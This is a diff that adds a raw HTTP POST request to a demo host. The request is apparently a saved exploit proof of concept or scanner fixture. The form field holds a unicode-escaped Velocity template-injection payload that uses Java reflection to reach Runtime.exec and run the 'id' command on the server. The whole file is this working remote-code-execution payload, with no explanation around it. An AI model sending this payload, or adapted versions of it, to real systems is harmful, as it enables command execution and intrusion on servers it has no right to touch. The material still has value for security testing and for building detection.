@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 113
+Connection: close
+
+input=#set($x=\u0022\u0022)$x.getClass().forName(\u0022java.lang.Runtime\u0022).getRuntime().exec(\u0022id\u0022)
